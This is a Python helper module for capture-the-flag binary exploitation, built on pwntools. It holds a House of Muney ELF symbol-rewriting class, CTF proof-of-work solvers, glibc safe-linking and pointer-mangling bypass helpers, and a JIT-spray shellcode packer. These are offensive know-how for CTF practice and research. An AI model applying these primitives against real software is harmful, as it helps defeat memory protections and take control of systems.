import math
import re

from pwn import ROP, asm, context, log, rol, ror, unpack, u64, u32, u16

pu64=u64
pu32=u32
pu16=u16

u64 = lambda d: pu64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pu32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pu16(d.ljust(2, b"\0")[:2])
upack = lambda d: unpack(d.ljust(context.bits // 8, b"\x00"), context.bits)


class HouseOfMuney:
    def __init__(self, elf: ELF):
        self.elf = elf
        self.payload = self.elf.get_segment_for_address(0).data()
        self.dynsym = self.elf.get_section_by_name(".dynsym")
        self.gnuhash = self.elf.get_section_by_name(".gnu.hash")

    def strtab(self):
        return self.dynsym.stringtable.header["sh_offset"]

    def symbol_offset(self, name):
        sym = self.get_sym(name)
        if sym is None:
            return -1

        p = flat(self.dynsym.structs.Elf_Sym.build(sym))
        offset = self.dynsym.data().find(p)
        if offset == -1:
            return -1
        return self.dynsym.header["sh_offset"] + offset

    def get_sym(self, name):
        return self.gnuhash.get_symbol(name).entry

    def set_sym(self, name, sym):
        off = self.symbol_offset(name)
        self.write(off, self.dynsym.structs.Elf_Sym.build(sym))

    def set_call(self, name, offset, data=b"sh\0"):
        sym = self.get_sym(name)
        idx = u32(data)
        sym["st_name"] = idx
        sym["st_value"] = offset
        sym["st_info"]["type"] = STT_GNU_IFUNC
        self.set_sym(name, sym)
        self.write(self.strtab() + idx, name)
        self.write(self.strtab() + idx + len(name), b"\0")

    def set_offset(self, name, offset):
        sym = self.get_sym(name)
        sym["st_value"] = offset
        self.set_sym(name, sym)

    def write(self, addr, data):
        if isinstance(data, str):
            data = data.encode()
        elif not isinstance(data, bytes):
            raise ValueError()
        if addr < 0 or addr + len(data) > len(self):
            raise IndexError()
        self.payload = self.payload[:addr] + data + self.payload[addr + len(data) :]

    def read(self, addr, size):
        return self.payload[addr : addr + size]

    def __len__(self):
        return len(bytes(self))

    def __bytes__(self):
        return self.payload


def _get_binary(name):
    b = config.config.get(name, default=None)
    if b is None:
        log.warn(f"Proof of work binary for {name} not found in config")
    return b


def solve_sossette(data):
    """
    Solve sossette pow
    """
    binary = _get_binary("sossette")
    if binary is None:
        return None

    prefix = re.findall(rb"SHA256\(([0-9A-Za-z]+) ", data)
    difficulty = re.findall(rb"starts with (\d+) bits", data)
    if len(prefix) == 0 or len(difficulty) == 0:
        log.error(f"Proof of work failed (sossette): {data}")

    prefix = prefix[0]
    difficulty = difficulty[0]
    p = run([binary, prefix, difficulty], stdout=PIPE, stderr=DEVNULL)
    if p.returncode != 0:
        log.error(f"Proof of work failed (sossette): {data}")

    return p.stdout


def solve_hxp(data):
    """
    Solve hxp pow
    """
    binary = _get_binary("hxp")
    if binary is None:
        return None

    prefix = re.findall(rb"sha256\(unhex\(\"([0-9A-fa-f]+)\"", data)
    difficulty = re.findall(rb"ends with (\d+) zero", data)
    if len(prefix) == 0 or len(difficulty) == 0:
        log.error(f"Proof of work failed (hxp): {data}")

    prefix = prefix[0]
    difficulty = difficulty[0]
    p = run([binary, difficulty, prefix], stdout=PIPE, stderr=DEVNULL)
    if p.returncode != 0:
        log.error(f"Proof of work failed (hxp): {data}")

    return p.stdout


def solve_redpwn(data):
    """
    Solve redpwn pow
    """
    binary = _get_binary("redpwn")
    if binary is None:
        return None

    arg = re.findall(rb"\| sh -s (.+)\n", data)
    if len(arg) == 0:
        log.error(f"Proof of work failed (redpwn): {data}")

    arg = arg[0]
    p = run([binary, "solve", arg], stdout=PIPE, stderr=DEVNULL)
    if p.returncode != 0:
        log.error(f"Proof of work failed (redpwn): {data}")

    return p.stdout


def solve_kctf(data):
    """
    Solve kctf pow
    """
    binary = _get_binary("kctf")  # kctf & redpwn are actually the same
    if binary is None:
        return None

    arg = re.findall(rb"\) solve (.+)\n", data)
    print(arg)
    if len(arg) == 0:
        log.error(f"Proof of work failed (kctf): {data}")

    arg = arg[0]
    p = run([binary, arg], stdout=PIPE, stderr=DEVNULL)
    print(p)
    if p.returncode != 0:
        log.error(f"Proof of work failed (kctf): {data}")

    return p.stdout


def solve_hashcash(data):
    """
    Solve hashcash pow
    """
    binary = _get_binary("hashcash")
    if binary is None:
        return None

    cmd = re.findall(rb"hashcash (-m.*?b\d+) ([0-9A-Za-z+/]+)", data)
    if len(cmd) == 0:
        log.error(f"Proof of work failed (hashcash): {data}")

    cmd = cmd[0]
    p = run([binary, cmd[0], cmd[1]], stdout=PIPE, stderr=DEVNULL)
    if p.returncode != 0:
        log.error(f"Proof of work failed (hashcash): {data}")

    return p.stdout


def solve_pow(data: bytes):
    """
    Take a buffer and detect the pow used and finally solve it using the solver set in config.

    Args:
        data: the buffer containing the pow to solve
    """
    functions = {
        b"Please provide an ASCII printable": solve_sossette,
        b"give S such that sha256": solve_hxp,
        b"https://pwn.red/pow": solve_redpwn,
        b"please solve a pow first": solve_kctf,
        b"hashcash": solve_hashcash,
    }

    for s, f in functions.items():
        if s in data:
            return f(data).strip()

    log.warn(f"Unknown proof of work: {data}")

def getb(d, a, b):
    """
    Extract a substring between two delimiters.

    Args:
        d (bytes or str): The data to search in.
        a (bytes or str): The start delimiter.
        b (bytes or str): The end delimiter.

    Returns:
        bytes or str: The substring between `a` and `b`.
    """
    a_ = d.find(a)
    if a_ == -1 or len(a) == 0:
        a_ = 0
    b_ = d.find(b, a_ + len(a))
    if b_ == -1 or len(b) == 0:
        b_ = len(d)
    return d[a_ + len(a) : b_]


def getr(d, p):
    """
    Extract the first match of a regex pattern from the data.

    Args:
        d (bytes or str): The data to search in.
        p (str): The regex pattern.

    Returns:
        bytes or str: The first match of the pattern.
    """
    return re.findall(p, d)[0]


def safelink_bf64(ptr)->int:
    """
    Recover a safelinked next pointer assuming both next & addr are in the same page.

    Arguments:
        ptr(int): The next value
    """
    fd = 0
    for i in range(36, -1, -12):
        tmp = fd
        fd <<= 12
        fd |= (tmp ^ (ptr >> i)) & 0xFFF
    if fd & 0xF != 0:
        log.warn("safelink_bf64(): page differs")
    return fd


def printx(**kwargs):
    """
    Print hex values for the specified keyword arguments.

    Args:
        **kwargs: Key-value pairs to print.

    Example:

        >>> printx(test=0x0)
        [+] test: 0x0
    """
    for k, v in kwargs.items():
        log.success("%s: %#x" % (k, v))


def hexdump(data, s=context.word_size // 8):
    """
    Print a hexdump of the specified data.

    Args:
        data (bytes): The data to dump.
        s (int): The size of each chunk in bytes.
    """
    idx_max = math.ceil(math.log(len(data), 16))
    for i in range(0, len(data), s):
        log.info(f"%0{idx_max}x: %#0{2 * s + 2}x" % (i, u64(data[i : i + s])))


def safelink(addr, ptr):
    """
    Compute the safelink value for a pointer.

    Args:
        addr (int): The base address.
        ptr (int): The pointer value.

    Returns:
        int: The safelinked value.
    """
    return (addr >> 12) ^ ptr


def ptr_mangle(addr, cookie=0):
    """
    Mangle a pointer with a cookie value.

    Args:
        addr (int): The address to mangle.
        cookie (int): The cookie value.

    Returns:
        int: The mangled pointer.
    """
    return rol(addr ^ cookie, 17)


def ptr_demangle(addr, cookie=0):
    """
    Demangle a pointer with a cookie value.

    Args:
        addr (int): The address to demangle.
        cookie (int): The cookie value.

    Returns:
        int: The demangled pointer.
    """
    return ror(addr, 17) ^ cookie


def ptr_cookie(mangled, demangled):
    """
    Compute the cookie value used to mangle/demangle a pointer.

    Args:
        mangled (int): The mangled pointer.
        demangled (int): The demangled pointer.

    Returns:
        int: The cookie value.
    """
    return ptr_demangle(mangled, demangled)


def jitspray(code, size=8, jmp=b"\xeb\x03"):
    """
    Perform a jitspray with movabs on x64 by default.

    Arguments:
        code(str):  Assembler code
        size(int):  Maximum code part size (default 8 for movabs)
        jmp(bytes): Stub for jumping between code parts
    """
    code = [asm(c) for c in code.splitlines()]
    size -= len(jmp)
    parts = [b""]
    for c in code:
        if len(c) > size:
            log.error(
                f"jitspray(): code part {c.hex()} too long for maximum size {size}"
            )
        p = parts[-1]
        if len(p) + len(c) > size:
            parts[-1] = p.ljust(size, b"\x90") + jmp
            parts.append(c)
        else:
            parts[-1] += c
    return [u64(p) for p in parts]


def encode(data):
    """
    Encode data to bytes if it is not already.

    Args:
        data: The data to encode (str, int, or bytes).

    Returns:
        bytes: The encoded data.
    """
    if isinstance(data, int):
        data = str(data).encode()
    elif isinstance(data, str):
        data = data.encode()
    return data
